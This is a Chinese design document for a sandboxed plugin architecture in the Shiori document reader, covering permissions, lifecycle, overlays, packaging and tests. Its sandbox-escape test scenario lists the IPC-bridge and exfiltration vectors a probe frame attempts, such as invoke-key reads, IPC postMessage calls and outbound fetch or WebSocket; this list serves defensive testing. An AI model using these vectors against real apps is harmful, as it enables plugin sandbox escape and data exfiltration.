  任何插件都没有 `provide("pdfReader")` 的权利（fact 2）。`appPdfEngine` 本身就是
  一个 Proxy，所以门面直接转发，不再套第二层。

## 生命周期与回收

状态机照 Cordis fiber：`pending → loading → active`，出错进 `failed`，卸载经过
`unloading → disposed`。平台或 capability 不满足时是 `unsupported`，`activate` 从不
调用。

- **激活。** T0 按 `src/plugins/builtin/index.ts` 里数组的顺序，在 `main.tsx` 第一次
  `render` 之前同步 apply，所以 RightRail 和 ShortcutsSheet 第一帧就能拿到完整的
  snapshot。这段接线没有测试桩（fact 11）。T1 的贡献在安装时就注册，不需要激活。
  T2 在 manifest 里写 `activation`：`"onStartup"`、`"onDocumentKind:pdf"`、
  `"onCommand:<id>"`、`"onPanel:<id>"`，frame 在第一个激活事件发生时才创建，冷启动
  不为插件多花时间。
- **注册即 effect。** 每次 `contribute` 和 `effect` 返回的 disposer 都压进这个插件的
  scope，卸载时逆序执行。单个 disposer 抛错只记日志，不打断其他 disposer（Cordis
  `fiber.ts:453-463`）。同一个 disposer 调两次是 no-op。apply 中途抛错时，已经登记的
  disposer 立即逆序执行，插件转 `failed`，兄弟插件不受影响。
- **冲突。** keyed 贡献点上 id 重复，后注册的插件 `failed`。keybinding 冲突除外：
  先注册的生效，后注册的进 `kernel.conflicts()`，插件页里列出来。
- **事件派发隔离。** 宿主对每个 listener 单独 try/catch，补上 Cordis `emit` 不隔离
  的缺口（`events.ts:104-107`）。T2 的事件是 fire-and-forget，frame 慢不会卡住宿主。
- **卸载 T2。** 顺序是：先一次性同步撤销宿主侧的全部注册，再关闭 port，最后移除
  iframe。移除 frame 就杀掉了插件的全部代码和定时器，不依赖插件自己清理。已经打开
  的面板随之卸载。**ext overlay 不删**，它的外观已经缓存了。
- **崩溃与挂死。** frame 会上报 `error` 和 `unhandledrejection`。宿主每 5 s 发一次
  心跳，10 s 没有应答就视为挂死。两种情况都转 `failed`、撤销注册、toast 一次；24 h
  内 `failed` 三次就自动禁用。所有 RPC 调用都有超时：默认 10 s，`exporters.run` 是
  60 s。超时的结果是 reject，不会留下一个永远挂着的 Promise。
  - 注意：如果 opaque frame 和主页面共用渲染线程（WKWebView 和 Android WebView 上
    可能如此），插件里一个 `while(true)` 会连心跳一起卡死。P0 探针要测这一点。测出
    来共用线程的平台，插件逻辑放进 frame 内部起的 blob Worker，iframe 只管 UI。
- **安全模式。** 启动时写一个 `shiori:plugins:boot` 标记，主界面就绪后清掉。下次
  启动发现标记还在，就跳过所有第三方插件，并显示一条「已禁用插件，查看」的横幅。
  这是 dsh desktop "Disable third-party plugins … and restart" 的等价物。
- **作用域。** 一个插件一个逻辑 frame，不按 tab 开。文档维度靠 API 参数里的
  `documentId` 区分，这是 Cordis `isolate` 的思路，但不照搬它的 Proxy。

## 权限模型与 Tauri 映射

权限写在 manifest 里，安装时逐项展示，高危项默认关闭、要单独打开。broker 是新文件
`src/plugins/host/broker.ts`，只调用 `src/platform/` 的 helper，fact 3 的 ESLint 规则
保证它 import 不了 Tauri。

| 权限 | 级别 | broker 走的路径 | 落到的 Tauri 面 | 平台门控 |
| --- | --- | --- | --- | --- |
| （无，隐式）贡献 command / keybinding / panel / setting / locale / storage | — | 内核 registry、`shiori-plugins` Dexie 库 | 无 IPC | 全平台 |
| `document.text` | 中 | `appPdfEngine.pageText` / `outline`；Markdown 和 HTML 取内存里的文本 | 桌面 `pdf_core_*`（已授予 `main`）；web 和 mobile 走 wasm worker；没有新命令 | 全平台 |
| `selection.read` | 中 | 编辑器 store 里的选区 | 无 IPC | 全平台 |
| `annotations.read` | 中 | `src/live/annotationDigest.ts` | 无 IPC | 全平台 |
| `annotations.write` | 中 | `parseSpec`（`src/pdf/annotations/parseSpec.ts`）→ `applyLiveAnnotationRequest`（`liveApiBridge.ts:258`），来源标成 `plugin:<id>` | 无 IPC（只是模型变更）；导出仍然是用户的动作 | 全平台 |
| `document.bytes` | 高 | workspace tab 已经持有的 bytes | 无新 IPC；不暴露路径 | 全平台 |
| `clipboard.write` | 低 | `navigator.clipboard`，要求 1 s 内有过用户手势 | 无 | 全平台 |
| `terminal.inject` | 高 | 与 `sendCalloutFollowUp`（`followUpLoop.ts:165`）相同，只写用户选中的会话 | `terminal_write`（`desktop-app-commands`） | `CAPABILITIES.embeddedTerminal` |
| `external.open` | 低 | 每次 `confirm` 之后调 `openExternalUrl` | `open_external_url` / `opener:allow-open-url` | 全平台（web 上用 `window.open`） |
| 保存导出文件 | — | 用户在对话框里选路径，走 `exportPlatformAdapter.saveBytes` | 现有的保存命令、dialog，mobile 上是 share | 全平台 |

规则：

1. **P1–P4 期间这些一行不改**：`src-tauri/capabilities/{default,mobile}.json`（两份都
   是 `"webviews": ["main"]`）、`src-tauri/permissions/*.toml`、
   `app_commands.rs` 里的 `APP_COMMANDS`。`lib.rs` 的 ACL 测试原样守着。唯一的例外
   是 P1a 改了 `detect_agent_clis` 的**返回类型**，命令名和 ACL 都不动。插件权限只是
   Tauri 已经授予 `main` 的能力的一个子集，broker 是唯一收窄的地方。
2. **插件永远拿不到路径、recents 和其他 tab 的列表。** TAURI-RULES 规定，接受路径的
   命令要校验用户授予过的路径，插件不在这条授予链上。
3. **v1 没有网络权限。** 桌面的 `connect-src` 只放行自家两个域名。给插件开网，等于
   新增一个 Rust fetch 代理命令，也就是一条官方的外传通道。`PLAN-agent-native.md:51`
   和 `:329` 砍掉的「API key + base URL 支路」是同一类东西（拍板 2）。
4. **更新包新增了权限时，停在旧版本**，等用户同意后再升级，不先禁用。
5. **P5 唯一新增的 Rust 面是插件菜单段。**
   - 新增一个 `async` 命令 `set_plugin_menu_items(items: Vec<{id, label}>)`，内部调
     `enforce_main_webview`；
   - 按 TAURI-RULES 同时加进 `APP_COMMANDS`、desktop TOML 和 `collect_commands!`；
   - `on_menu_event` 加一个 `id.starts_with("menu-ext-")` 分支，发 `menu:ext:<id>`；
   - label 由主 realm 用 `t()` 解析后传进去，插件不能直接调这个命令。

## Overlay 扩展形状

### 静态穷尽表（P0c，先于任何插件）

```ts
// src/pdf/model/overlayKinds.ts（新；静态，不经过运行时 registry）
export interface OverlayKindSpec<K extends OverlayType> {
  type: K;
  /** drafts.ts isOverlay 里对应的分支。 */
  validate(value: Record<string, unknown>): value is Extract<Overlay, { type: K }>;
  /** mode "annotations"；"skip" 必须在旁边注释理由。 */
  toAnnotation:
    | ((page: PDFPage, o: Extract<Overlay, { type: K }>, fonts: () => FreeTextFontNames) => PDFRef)
    | "skip";
  /** mode "flatten"；返回 lostChars。 */
  flatten:
    | ((out: FlattenTarget, o: Extract<Overlay, { type: K }>, deps: FlattenDeps) => number | Promise<number>)
    | "skip";
}
export const OVERLAY_KINDS: { readonly [K in OverlayType]: OverlayKindSpec<K> } = {
  // …
  // image 和 contentText 在 annotations 模式下画进页面内容（exportPdf.ts:320-330，
  // 条件在 :325；image 在 :986，contentText 在 :1000），不产出 annotation：
  image:       { /* … */ toAnnotation: "skip", flatten: drawImageOverlayKind },
  // contentText 在 flatten 里走字形删除这条路（exportPdf.ts:955-965），这里也是 skip：
  contentText: { /* … */ toAnnotation: "skip", flatten: "skip" },
  // P4：ext 是表里的一个成员，两种模式都用缓存的外观来写
  // ext:      { validate: isExtOverlay, toAnnotation: writeExtStamp, flatten: drawExtOps },
};
```

- **映射类型守住漏写。** `{ [K in OverlayType]: … }` 让「加了一种 overlay 却忘了写
  写入器」成为编译错误，这是 F3 缺的守卫。`buildAnnotRef`（`annotations.ts:447`）和
  flatten 链（`exportPdf.ts:966-975`）都改成按表查。查不到时抛
  `ExportIntegrityError`：类型系统已经保证查得到，这一句防的是运行时数据损坏。
- **为什么是静态表。** 导出和草稿校验是逐个 overlay 跑的循环，查静态表比查运行时
  registry 便宜，也不会因为某个插件被禁用而改变结果。
- **渲染和命中测试路径不迁。** `OverlayLayer.tsx`、`overlaySvg.tsx` 等文件属于热
  路径，收益和风险不成比例。

### ext overlay（P4）

```ts
// src/pdf/model/types.ts 新增
export type ExtOverlay = OverlayCommon & {
  type: "ext";
  ext: {
    plugin: PluginId;
    kind: string;                     // 插件内部的类型名
    schema: number;                   // 插件自己的 payload 版本
    payload: JsonValue;               // ≤ 16 KB
    appearance: ExtAppearance;        // 插件最后一次给出的外观，由宿主缓存
  };
};
export type ExtAppearance = {
  rect: PdfRect;                      // PDF user space（fact 1）
  ops: readonly (
    | { op: "path"; d: string; fill?: string; stroke?: string; width?: number }
    | { op: "text"; x: number; y: number; size: number; text: string; color?: string }
  )[];                                // ≤ 2 000 个 op，坐标都在 rect 以内
};
```

- **渲染。** 宿主把 `ops` 画成 SVG，在 `overlaySvg.tsx` 里加一个分支；命中测试只用
  `rect`。插件不在渲染热路径上，拖动和缩放都不发 RPC。
- **工具。** 插件工具只能从宿主提供的手势模式里选（`"click" | "drag-rect" |
  "freehand"`）。手势结束后，宿主把几何（PDF user space）发给插件一次，插件回传
  `payload + appearance`。
- **草稿（修 F2）。** `drafts.ts` 的 `isOverlay` 在结构上接受 `type: "ext"`：只校验
  大小上限和 ops 的形状，不认识的 `plugin` 也接受。`LIVE_BATCH_OVERLAY_TYPES`
  （`:520`）暂不收 `ext`，等 Live API 有了 ext spec 再说。
- **导出。**
  - annotations 模式写一个 `/Stamp`，`/AP` 由 ops 生成，再加一个私有 dict
    `/ShioriExt`，里面放 `plugin/kind/schema/payload`，供回读。
  - flatten 模式直接把 ops 画进页面。
  - 写入器仍然是宿主的 pdf-lib（fact 2）。外观缺失或越界时抛 `ExportIntegrityError`，
    不再静默丢弃。
- **插件被卸载之后。** overlay 照常显示和导出，可以删、可以移动，但不能再编辑
  payload。选中时提示「来自已移除的插件 X」。

### 持久化的引用要能熬过插件缺席（不变量 3）

prefs 和 workspace 都在插件激活**之前**加载，所以今天的三处校验器都会把插件留下的
引用当成坏数据丢掉：

| 校验器 | 现在的行为 | 改成 |
| --- | --- | --- |
| `src/storage/workspace.ts:396` `isDocumentKind(tab.kind)` | 丢掉 `ext:` tab | 在结构上接受 `` `ext:${string}` ``，渲染时插件不在就显示占位 |
| `src/editor/store/store.ts:795` `isPrefsTheme(parsed.theme)` | 把插件主题 id 重置回默认 | 接受 `ext:` 前缀，渲染时插件不在就回落到 Default（只有主题成为贡献点时才需要） |
| `src/storage/drafts.ts:393` `isOverlay` | F2 | 见上 |

## 内置功能怎么迁上来

规则照搬 seams-first：**消费方留在原地，只把它读的硬表换成 registry snapshot，派发
逻辑一行不动；迁移完之后，视觉和行为都和迁移前一样。** 每一步都按 AGENTS.md
「Bug fixes start red」先写出能失败的检查，每一步都是一个独立的 change。任何碰到
工具、按键或渲染路径的步骤，都要用 `scripts/perf/tauri-probe.ts` 做迁移前后的对照
gate。

**P1a · Agent CLI 名单（修 F4）**

- Rust：
  - `AgentCliAvailability { claude_code, codex }` 换成一张 const 表
    `KNOWN_AGENT_CLIS: &[(&str /*id*/, &str /*exe*/)]`；
  - `installed_agent_clis()` 返回 `Vec<String>`；
  - 要一起改的地方：`agent_clis.rs:11-34`，`host_tools.rs:32` 和 `:80` 的两个
    `detect_agent_clis` 返回类型（两个 cfg 变体），`agent_clis.rs:170`/`:193` 两处测试；
  - 前端**不传**任何可执行名，命令名不变，ACL、TOML、capability 都不动；
  - `bindings.ts:413` 重新生成。
- TS：
  - `hasAgentCli(ids) = ids.length > 0`；
  - `normalizeAgentCliAvailability`（`agentCli.ts:15`）只认新形状就够了。前端和 Rust
    在同一个 bundle 里发布，不会出现新旧版本混搭。
- 先红：写一条 Rust 测试，断言目录里只有 `gemini` 时能检测到它，确认它在旧代码上
  失败。
- E2E：用桌面 bundle，PATH 上只放一个假的 `gemini`，打开 callout，截图证明追问控件
  出现了。产物放在 `test-artifacts/plugins-p1a-agent-cli/`。
- Gate：`bun run verify` 加 `bun run tauri build`；动命令之前先读 `docs/TAURI-RULES.md`。
- 名单里加哪些 agent 是用户看得见的行为变化（拍板 7）。

**P1b · command / keybinding 单表（同一个 change 里带上 F6 的静态检查）**

- 各处改成从 keybinding 表派生：
  - `TOOL_KEYS`（`canvasKeymap.ts:45-55`）和 `:110` 的 ⇧U 改成从 `scope === "canvas"`
    的 keybinding 派生，按 snapshot 引用缓存，按键时不重算；
  - `ShortcutsSheet` 的 `GROUPS` 由 `sheetGroup` 和 `sheetRow` 生成，"H / U / ⇧ U"
    这类合并行由同一个 row 的多条绑定拼出来；
  - toolbar 的 `hint` 同样派生；
  - `useAppShortcuts.ts` 里的 ⌘S 带 `beforeEditableGuard: true`，保留 `:71-90` 注释
    写明的语义。
- `nativeMenu.ts` 的每个 channel 改成调 `commands.run(id)`。
- 组件局部的 `keydown`（Escape 关闭、焦点陷阱、FindPanel 内部）不收进来。
- 先红：写一条测试，断言「快捷键说明表和 toolbar hint 显示的键 = canvas keymap 实际
  派发的键」。在旧代码上临时改掉一个 `TOOL_KEYS` 的键，确认这条测试失败，然后再
  迁移。
- 回归网：`canvasKeymap.test.ts`、`nativeMenu.test.ts`、`keys.test.ts`，外加 F6 的
  registry key 检查。
- E2E：在 web 构建里依次按 V/H/U/⇧U/I/G/S/R/C/T，打开快捷键说明表截图；在 Markdown
  编辑器里按 ⌘S，确认能保存；桌面用 probe 触发菜单里的 undo 和 fit-width。产物放在
  `test-artifacts/plugins-p1b-commands/`。

**P1c · rail panel 与设置分区**

- `RailTab` 换成 `BuiltinRailTab | \`ext:${string}\``，`outline`、`comments`、
  `terminal`、`browser` 改成 T0 注册。
- terminal 和 browser 带 `keepMounted: true`，保住 `RightRail.tsx:157`/`:184` 的挂载
  状态（POSTMORTEMS 2026-07-30 :2841「React 树本身还在重挂」）。
- `railTab` 只存在 store 里（默认值在 `store.ts:1014`），不进 prefs，所以不需要做
  持久化迁移。
- 设置分区拆成各内置插件自己注册，顺序照现在写死。Settings 里新加一个「插件」分区，
  列出状态和 `conflicts()`。
- 启停的覆盖值记在 `Prefs.pluginOverrides: Record<PluginId, boolean>`，只记和默认值
  不同的项（dsh 的 profile patch 做法）。
- E2E 覆盖三端：
  - 桌面：terminal → outline → terminal 切一圈，会话还在；窗口缩窄后 terminal tab
    隐藏；
  - web：没有 terminal 和 browser 两个 tab；
  - Android 平板：有 browser，没有 terminal。

**P5（可选）· DocumentKind 单一数据源**

- 新建 `src/documents/kinds.ts` 作为唯一数据源，生成 `DOCUMENT_PICKER_ACCEPT` 和
  Rust 端的过滤器 / 识别表（`documents/mod.rs:105-112`、`:253`、`:551`）。
- `tauri.conf.json:56-76` 的 `fileAssociations` 和
  `src-tauri/gen/android/app/src/main/AndroidManifest.xml` 里的 VIEW / SEND
  intent-filter 不做生成，只加一条静态检查，断言它们和数据源一致，做法同
  `src/release/versionLockstep.test.ts`。
- 内置的四种 kind 保持构建期常量；插件 kind 是 `` `ext:${string}` ``，只能在 app 内
  打开。

**不迁的部分：**`PdfEngine`、PDF 导出写入器、草稿存储、Live API 的 Rust 路由、
终端、Browser panel、overlay 的渲染和命中测试、run-mode HTML。run-mode HTML 和 T2
共用容器代码（新文件 `src/sandbox/frame.ts`），但它本身不是插件（拍板 10）。

## 插件 frame 里的焦点、无障碍、主题

- **快捷键。** `useAppShortcuts.ts:101` 和 canvas keymap 都监听 `window` 上的
  `keydown`，焦点进了插件面板的 iframe 之后，事件不会冒泡到父文档。SDK 在 frame 里
  装一个 `keydown` 监听：插件没有 `preventDefault` 的按键，把描述
  `{ key, code, mod, shift, alt }` 经 port 转发给宿主（不转发 target 或任何内容），由
  宿主的同一个分派器处理。editable guard 由 frame 一侧判断：焦点在 frame 内的输入框
  上时不转发，⌘S 除外，和宿主的语义一致。
- **焦点进出。** 宿主的 `useFocusTrap` 管不到 frame 内部。约定 Escape 由 SDK 转发，
  宿主收到后把焦点还给面板 tab。
- **无障碍。** iframe 带 `title={t(panel.titleKey)}`。屏幕阅读器跨 frame 的体验要在
  VoiceOver、Narrator、TalkBack 上各走一遍，作为 P3 的 E2E 产物。在那之前，插件页
  对第三方面板注明「无障碍未验证」。
- **主题。** 插件 frame 拿不到宿主的 CSS。宿主在 `init` 里下发一组 token（颜色取自
  `src/design/theme.ts`，加上字体和深浅色），并订阅 `useEffectiveTheme` 的结果，
  `prefers-color-scheme` 或用户主题一变就通过 port 推一条 `theme:changed`。frame
  里的 `color-scheme` 由 SDK 同步设置，否则滚动条和表单控件会停在旧的配色上。

## 打包、manifest、安装、启用、更新

包就是一个 zip，扩展名 `.shiori-plugin`，用 `fflate` 解压（已经是依赖）：

```
manifest.json
main.js                 只有 T2 才有；单文件 ES bundle，没有 import
views/<name>.js         面板 view 的入口（可选）
locales/<lang>.json     要求哪几份见拍板 5
icon.svg                宿主净化后渲染
SIGNATURE               minisign 签名，签的是 manifest.json（里面含全部文件的 sha256）
```

```json
{
  "schema": "shiori.plugin/v1",
  "id": "dev.example.wordcount",
  "version": "1.2.0",
  "pluginApi": 1,
  "minApp": "26.11.0",
  "tier": "sandboxed",
  "platforms": ["web", "desktop", "android"],
  "requires": [],
  "permissions": ["document.text"],
  "activation": ["onCommand:dev.example.wordcount.count"],
  "contributes": {
    "command": [{ "id": "dev.example.wordcount.count", "titleKey": "count.title" }],
    "keybinding": [{ "command": "dev.example.wordcount.count", "chord": { "key": "w", "mod": true, "shift": true }, "scope": "global" }],
    "settings": { "type": "object", "properties": { "includeNotes": { "type": "boolean", "default": false } } }
  },
  "main": "main.js",
  "files": { "main.js": "sha256-…", "locales/en.json": "sha256-…" }
}
```

- **版本。** `pluginApi` 是整数大版本，和 app 的 calver（`package.json:5` 现在是
  `26.10.20`）分开。在 calver 上写 SemVer range（比如 `>=26.11.0 <27.0.0`），读起来像
  在承诺每次发布都兼容，所以不用。`minApp` 是可选的功能下限。
- **`requires`** 取 `CAPABILITIES` 的键（`src/platform/index.ts:134`）。不满足时插件
  状态是 `unsupported`，插件页标「此平台不可用」。
- **settings schema** 只收 JSON Schema 的一个子集：boolean、带范围的 number、string
  enum、string。文案 key 走插件自己的 namespace。不引入 schemastery。
- **签名与信任，分三档：**
  - 官方：用 Shiori 的插件密钥签。这把密钥**不复用** `tauri.conf.json` 里的 updater
    pubkey，也不进 `build-signed.sh`。
  - 社区：作者自己的 minisign 公钥。首次安装时展示指纹，之后同一个 id 的更新必须用
    同一把钥签。
  - 未签名：只有打开「开发者模式」才能装；桌面另外支持直接挂载一个用户在 picker 里
    选的文件夹做开发。

  Ed25519 校验在 TS 里做。`@noble/hashes` 已经是依赖，验签用 WebCrypto 还是加一个
  `@noble/curves`，在 P2 按 WKWebView 的最低版本定。
- **发现。** v1 没有插件市场。官方目录放在
  `https://shiori.nagi.fun/plugins/index.json`，这个域名已经在桌面的 `connect-src`
  里，不用改 CSP。目录只列官方签名包，由宿主去拉，插件自己不能拉。社区包由用户自己
  下载文件安装。不接受第三方 index URL，也不用 GitHub topic：dsh 的 `dsh-plugin`
  topic 有两万多个仓库，其中有越狱插件和冒充免费模型的插件。
- **安装入口（fact 9，逐条路线写清楚是运行时还是构建期）：**

  | 路线 | 怎么接 | 性质 |
  | --- | --- | --- |
  | web picker / drag-drop | Settings → 插件 →「从文件安装」，用 `<input type=file>`；拖进窗口由 intake 按扩展名分流 | 运行时 |
  | 桌面原生 picker / drag-drop | 复用文档 picker，加一个 `.shiori-plugin` 过滤器（`documents/mod.rs:105-112` 那组 `add_filter`） | 动 Rust 过滤器，属于构建期，但不加新命令 |
  | 桌面文件关联（双击 `.shiori-plugin`） | `tauri.conf.json:56-76` 的 `fileAssociations` 加一项；macOS 走 `Opened`，Windows / Linux 走 single-instance argv | **构建期**，要过 RELEASE-CHECKS |
  | mobile picker | 文档 picker 放行 `application/zip` / octet-stream | 运行时 |
  | Android share / VIEW | `AndroidManifest.xml` 的 VIEW / SEND intent-filter 加 MIME（`application/octet-stream` 已经在 VIEW 里了，SEND 要核对） | **构建期**，要过 RELEASE-CHECKS |

  流程照 dsh 的 inspect-then-install：先解析，校验签名、`pluginApi` / `minApp` 和
  文件 hash，再展示权限，用户确认之后才写库。任何一步失败都什么也不落盘。解压后大小
  上限 10 MB，拒绝 zip 里的路径穿越（`../`）。
- **存储。** 独立的 Dexie 库 `shiori-plugins`，表是 `packages`、`grants`、`data`。
  它不进草稿库，不占草稿的 1 GB 配额，也不参与草稿的 LRU（fact 4）。和 app 同一个
  origin（fact 5，不为了隔离去改 identifier）。
- **启用与禁用。** 插件页的开关即时生效；另有一个总开关「禁用所有第三方插件」。
- **更新。** 同一个 id、版本更高的包覆盖安装。新增了权限就停在旧版本，等用户同意。
  旧版本的 bytes 保留一份，可以回滚。官方包从 P5 起按 index 检查更新，只提示，不
  自动装。
- **兼容例外。** 照 dsh 的 `compatibility.json`，精确到 `id@version` × Shiori 版本，
  不继承到其他版本，授予时要用户勾选「我了解风险」。等真有需要再做。
- **CLI。** 提供 `shiori plugin pack | verify | inspect <file>`，和 app 共用
  `src/plugins/manifest.ts`，做法同 `cli/src/liveOperation.ts` 的 re-export。CLI 不
  执行插件。

## 版本与 API 稳定性

- **破坏性改动只在大版本上做。** 旧的大版本至少保留两个 app 小版本，插件页上标
  「过期」。
- **RPC 协议是闭合的。** 每条消息带 `v: 1`，方法名表是闭合的。frame 发来未知方法
  就拒绝并记日志，不会崩。单条消息上限 8 MB，`document.bytes` 用 transferable 的
  `ArrayBuffer` 传。
- **schema 字符串沿用仓库已有做法。** `shiori.plugin/v1` 管 manifest，
  `shiori.annotations/v1` 管写入，和 `ANNOTATION_SPEC_SCHEMA`、
  `LIVE_OPERATION_SCHEMA` 一样。
- **冻结节奏。** P3 之前 API 标 `experimental`，安装页上写明可能会变；P4 结束时冻结
  `pluginApi: 1`。P1 期间内核类型都是 `@internal`：内置插件和 app 一起编译，改 API
  就是改调用方。
- **SDK。** `@shiori/plugin-sdk` 包括类型、`client.ts` 代理和打包脚本，跟着
  `pluginApi` 发版，和 CLI 一样走独立的 tag（`sdk-v*`）。

## 测试

按 AGENTS.md 的顺序：E2E 先行；隔离测试先列失败清单，再写测试，最后写代码。

**E2E 场景**（产物放在 `test-artifacts/<scenario>/`，生成命令写在同目录的 README 里）：

1. `plugins-sandbox-escape`：探针 frame 输出一份 JSON 报告，每一项标 blocked 或
   allowed。检查项按这个顺序：
   1. blob: 文档里的 meta CSP 是否生效。这一项不过，后面的都没有意义。
   2. 平台 IPC 锁（F5 那张表）：
      - `window.__TAURI_INTERNALS__` 是否存在，以及能否读到 invoke key；
      - `__TAURI_INTERNALS__.invoke("detect_agent_clis")`；
      - `window.ipc.postMessage`；
      - `window.chrome.webview.postMessage`；
      - `window.webkit.messageHandlers.ipc.postMessage`；
      - `fetch("http://ipc.localhost/…")` 和 `fetch("ipc://localhost/…")`。
   3. 外传：`location.href` 自我导航、`fetch`、`new WebSocket`、`RTCPeerConnection`。
   4. 存储与宿主：`indexedDB.open`、`localStorage`、`parent.document`、
      `top.location`。
   5. 线程与能力：blob Worker 能否创建，`while(true)` 期间宿主是否还能响应。

   web（Chrome）、macOS、Windows、Linux、Android 各跑一遍；桌面用
   `scripts/perf/tauri-probe.ts`。F1 的两次 Chrome 实测就是这个场景的第一版。
   Tauri / wry 每次升级都重跑。
2. `plugins-wordcount`：在 web 构建里装示例插件，跑 command，面板显示字数，截图；
   再在桌面 bundle 里重复一遍。
3. `plugins-disable-live`：面板开着的时候禁用插件，确认面板消失、快捷键失效、ext
   overlay 还在，导出的 PDF 里也还在（导出文件随产物保存）。
4. `plugins-hang`：装一个死循环插件，确认 10 s 内转 `failed`，app 交互不受影响
   （录 GIF）。
5. `plugins-safe-mode`：装一个启动期就崩溃的插件，确认下次启动进入安全模式。
6. `plugins-builtins-parity`：迁移前后对照同一组快捷键、工具栏和 rail 的截图，外加
   probe 的延迟 JSON。
7. `plugins-overlay-export`：每种 overlay 各画一个，两种模式各导出一次，用 CLI
   `extract` 读回，输出 JSON 报告（P0c 和 P4 各跑一次）。

**失败清单**（写测试之前先把它补全）：

- **内核**
  - disposer 逆序执行；其中一个 disposer 抛错时其余照常执行；同一个 disposer 调两次
    是 no-op；
  - apply 中途抛错，已注册的立即回收，插件 `failed`，兄弟插件不受影响；
  - 卸载之后再 `contribute` / `effect`，抛 `INACTIVE_EFFECT`；
  - keyed id 重复时后来者 `failed`；keybinding 冲突进 `conflicts()`；
  - 往未声明的贡献点贡献，或重复声明同一个点，在激活时 fail；
  - snapshot 在没有变化时引用稳定，有变化时引用改变（否则 `useSyncExternalStore`
    会无限重渲染）；
  - `platforms` 或 `requires` 不满足时状态是 `unsupported`，`activate` 从未被调用；
  - listener 抛错不影响其他 listener；
  - 依赖的 service 撤回时依赖方先卸载；provider 被替换时 epoch 重启；
  - `reconfigure` 返回 true 不重启，返回 false 重启；
  - 配置非法时插件 `failed`；异步 schema 被拒绝。
- **manifest**：缺 locale、id 冲突、`pluginApi` 不匹配、`minApp` 不满足、未知权限、
  未知贡献点、文件 hash 不符、签名换钥、zip 路径穿越、超大包。
- **broker**：未授权的调用；授权被撤销时还在途的调用；`documentId` 指向已关闭的
  tab；不在手势之后的剪贴板写入；在 mobile 上调 `terminal.inject`。
- **RPC**：不是从 port 来的消息、伪造的 `source`、超大消息、未知方法、超时、调用
  途中 frame 被移除、重复的 `init`。
- **ext overlay**：ops 超限、坐标越界、未知插件、history 往返、两种导出模式、缺外观
  时拒绝导出。

**静态检查**（都是带书面理由的仓库级不变量）：

- registry 里的 i18n key 都在 `en.json` 里，P1b 起生效（F6）；
- 内置插件和 T1 包的 locale 完整；
- 权限枚举、broker 表和本文的表格三者一致；
- 插件 frame 只带 `allow-scripts`，并且注入了 `connect-src 'none'`（DOM 测试）；
- `src/plugins/kernel/` 的 import 边界（ESLint）；
- P5 的 `fileAssociations` 和 AndroidManifest 与 `kinds.ts` 一致。

`capabilities/*.json` 和 `APP_COMMANDS` 继续由现有的 ACL 测试守着，不加豁免。

**不测**：`main.tsx` 里的 boot 和 `App.tsx` 里挂载 `<PluginHost>` 的接线（fact 11），
提交说明里写明这部分没有覆盖。

## Roadmap

| 阶段 | 内容 | 用户能看到的 |
| --- | --- | --- |
| **P0a** bug fix，不等插件方向 | web `public/_headers` 加 `frame-src 'self' blob:`；删掉 `navigate-to` 和注释里的承诺；Chrome 探针产物 | run-mode HTML 在 web 上真的出不了网 |
| **P0b** 探针 | `plugins-sandbox-escape` 覆盖五个平台；Windows 的 F5 结论；完整的 web CSP（放行 Cloudflare beacon） | 无；结论决定 T2 在哪些平台开 |
| **P0c** 穷尽表 | F3 先写红测，再上 `OVERLAY_KINDS` | 以后新增 overlay 不会再在导出里消失 |
| **P1** 内核 + T0 | kernel（按失败清单来）；P1a agent CLI → P1b command / keybinding 加 F6 检查 → P1c rail / 设置 / 插件页，**三个 change 分开合并** | 其他 agent CLI 也能用追问；快捷键说明和实际按键由同一张表保证一致；设置里出现「插件」分区 |
| **P2** T1 声明式包 | `.shiori-plugin` 的解析、签名、安装 UI；`shiori-plugins` 库；安全模式；插件 locale namespace；CLI `plugin pack/verify/inspect` | 可以装「快捷键方案」「自定义 stamp」这类无代码包 |
| **P3** T2 沙箱代码 | frame 宿主加 MessagePort RPC、broker、权限 UI、command / panel / exporter / 文档动作；只在 P0b 通过的平台开；焦点、主题、无障碍 | 第三方面板和导出格式，比如「把批注导出为 Markdown」 |
| **P4** overlay 与工具 | `type: "ext"` 进 `OVERLAY_KINDS`；三处校验器（不变量 3）；手势模式；`/AP` 写入和 `/ShioriExt` 回读；冻结 `pluginApi: 1` | 插件自定义的标注类型 |
| **P5** 文档类型、菜单、目录 | `ext:*` 文档 kind（只在 app 内打开）、`kinds.ts` 单一数据源、`set_plugin_menu_items`、官方 index、更新提示；文件关联和 share 的构建期改动 | 新文件格式的查看器；菜单里出现插件命令；双击 `.shiori-plugin` 即可安装 |
| **P6**（可选）T3 | Live API 增加路由（比如 `GET /v1/selection`），按客户端分 token | agent 和脚本拿到更多只读上下文 |

每个阶段的 gate 照旧：都要过 `bun run verify`；动了 `crates/` 加跑
`bun run test:core`；动了 `src-tauri/`（P1a、P5）加跑 `bun run tauri build`，并确认
`bindings.ts` 只出现预期的 diff；碰工具或渲染路径时，附上 probe 的前后对照。

## Invariants

1. 第三方代码不在主 webview 的 realm 里执行，也不能经 `script-src data:` 进去。
2. 插件权限 ⊆ Tauri 已经授予 `main` 的能力。P1–P4 不改 capability、permission
   TOML、`APP_COMMANDS`；CSP 只收紧不放宽。
3. 持久化下来的插件引用（tab kind、主题 id、overlay）在插件缺席时仍然有效：三处
   校验器在结构上接受 `ext:` / `type: "ext"`，解析推迟到渲染时。
4. 只有 `src/platform/` import `@tauri-apps/*`，broker 也不例外（fact 3）；
   `src/plugins/kernel/` 不 import `src/platform/`。
5. 一个读引擎、一个写入器（fact 2）：插件不能 provide `pdfReader`，也不写 PDF。
6. 插件拿不到路径、recents，也拿不到其他 tab 的列表。
7. 插件写标注只走一条路：`shiori.annotations/v1` → `applyLiveAnnotationRequest`。
8. `Overlay` union 的每个成员在 `OVERLAY_KINDS` 里都有显式的 `toAnnotation` 和
   `flatten`，可以是函数，也可以是带理由的 `"skip"`。漏写就是编译错误。
9. 插件文案走 `t()`；registry 里的 key 和 `t("…")` 字面量接受同样的检查（fact 6）。
10. 插件存储和草稿库分开，bundle identifier 不动（fact 4、5）。
11. 每个注册都有 disposer；禁用插件不需要重启。
12. 沙箱承诺按平台分别写：哪个平台的探针没过，哪个平台就不开 T2。

## Risks

- **WebView 差异。** 沙箱的前提只在 Chrome 上实测过。F5 在 Windows 上靠的是一个
  WebView2 投递行为，这不是 Tauri 的设计保证，Tauri 或 WebView2 升级都可能改变它，
  所以探针要绑在升级流程上。
- **API 冻结成本。** 一旦有了第三方用户，`pluginApi: 1` 的每个形状都会变成负担。
  所以 P1–P2 只放数据和 T0，到 P4 才冻结。
